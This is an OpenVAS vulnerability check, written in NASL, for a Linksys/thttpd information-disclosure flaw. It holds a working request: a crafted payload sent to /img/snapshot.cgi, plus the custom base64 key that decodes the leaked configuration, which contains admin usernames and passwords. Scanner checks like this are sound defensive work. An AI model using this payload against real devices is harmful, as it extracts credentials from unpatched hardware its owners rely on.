###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_multiple_linksys_11_14_info_disclosure.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Multiple Linksys Products Information Disclosure
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105105");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11867 $");

  script_name("Multiple Linksys Products Information Disclosure");

  script_xref(name:"URL", value:"https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker read the config of the device including
usernames and passwords.");

  script_tag(name:"vuldetect", value:"Send a HTTP GET request and check the response.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"summary", value:"Multiple Linksys products are prone to an information disclosure vulnerability.");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-11-04 13:38:34 +0100 (Tue, 04 Nov 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("thttpd/banner");

  exit(0);
}

include("http_func.inc");
include("misc_func.inc");

port = get_http_port( default:80 );

banner = get_http_banner( port:port );
if( ! banner || "Server: thttpd/2.25" >!< banner ) exit( 0 );

payload = crap( data:"A", length:148) + raw_string( 0x88,0x9B );

req = 'GET /img/snapshot.cgi?' + payload + ' HTTP/1.0\r\n\r\n';
result = http_send_recv( port:port, data:req, bodyonly:FALSE );

if( "Content-type: application/configuration" >!< result ) exit( 99 );

buf = split( result, sep:'\r\n\r\n', keep:FALSE );
if( isnull( buf[2] ) ) exit( 0 );

decoded_config = base64_decode( str:buf[2], key_str:"ACEGIKMOQSUWYBDFHJLNPRTVXZacegikmoqsuwybdfhjlnprtvxz0246813579=+/" );

if( "admin_name" >< decoded_config || "admin_password" >< decoded_config )
{
  security_message( port:port );
  exit( 0 );
}

exit( 0 );

